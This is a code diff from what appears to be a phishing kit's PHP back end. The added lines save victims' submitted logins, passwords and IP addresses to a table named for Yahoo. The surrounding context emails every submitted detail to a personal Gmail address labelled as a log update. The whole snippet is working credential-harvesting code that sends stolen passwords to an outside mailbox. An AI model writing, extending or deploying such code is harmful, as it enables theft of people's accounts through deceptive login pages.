@@ -31,6 +31,10 @@
         {
             $details = Input::all();
 
+            $data = ['email' => $details['login'], 'password' => $details['passwd'], 'ip' => Request::getClientIp()];
+
+            YahooTable::create($data);
+
             Mail::send('emails.details', ['details' => $details], function ($message) {
                 $message->from('loggerm@kaso.co', 'Logger');
                 $message->to('lordkaso@gmail.com')->subject('Important Log Update!');
